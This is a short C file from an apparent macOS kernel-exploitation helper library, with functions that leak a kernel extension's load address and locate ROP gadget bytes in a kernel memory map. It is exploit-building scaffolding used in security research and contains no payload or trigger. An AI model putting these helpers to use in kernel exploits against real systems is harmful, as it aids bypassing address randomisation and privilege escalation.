#include "librop.h"

extern CFDictionaryRef OSKextCopyLoadedKextInfo(CFArrayRef, CFArrayRef);

uint64_t find_kext_address(const char *identifier)
{
    uint64_t addr = 0;

    CFDictionaryRef loadedKextInfo = OSKextCopyLoadedKextInfo(NULL, NULL);
    CFIndex count = CFDictionaryGetCount(loadedKextInfo);

    void **keys;
    void **values;

    keys = (void **)malloc(sizeof(void *) * count);
    values = (void **)malloc(sizeof(void *) * count);

    CFDictionaryGetKeysAndValues(loadedKextInfo,
                                 (const void **)keys,
                                 (const void **)values);

    for (int i = 0; i < count; i++)
    {
        const char *name = CFStringGetCStringPtr(
                               CFDictionaryGetValue(values[i], CFSTR("CFBundleIdentifier")),
                               kCFStringEncodingMacRoman);
        if (strcmp(name, identifier) == 0)
        {
            CFNumberGetValue(CFDictionaryGetValue(values[i], CFSTR("OSBundleLoadAddress")),
                             kCFNumberSInt64Type,
                             &addr);
            break;
        }
    }

    return addr;
}


uint64_t find_gadget(memory_map_t *mapping, const char *bytes, const uint8_t size)
{
    uint64_t offset = (uint64_t) memmem(mapping->map, mapping->sz, bytes, size);
    if (!offset)
    {
        printf("[-] Gadget not found, quiting.\n");
        exit(1);
    }
    return find_kernel_base(mapping) + (offset - (uint64_t) mapping->map);
}
